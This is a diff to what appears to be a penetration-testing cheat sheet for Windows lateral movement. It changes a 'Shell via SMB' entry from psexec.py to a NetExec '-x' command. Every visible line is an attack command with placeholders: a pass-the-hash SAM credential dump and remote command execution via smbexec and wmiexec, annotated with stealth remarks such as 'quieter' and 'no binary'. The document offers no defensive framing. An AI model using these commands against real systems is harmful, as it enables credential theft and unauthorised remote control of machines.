@@ -10,7 +10,7 @@ SAM dump (needs local admin):
     nxc smb <target-ip> -u <user> -H <NT-hash> --sam
 
 Shell via SMB:
-    psexec.py   <domain>/<user>@<target-ip> -hashes :<NT-hash>   (drops binary)
+    nxc smb <target-ip> -u <user> -H <NT-hash> -x "<cmd>"
     smbexec.py  <domain>/<user>@<target-ip> -hashes :<NT-hash>   (no binary)
     wmiexec.py  <domain>/<user>@<target-ip> -hashes :<NT-hash>   (WMI, quieter)
     [local acct] use ./<user> instead of <domain>/<user>
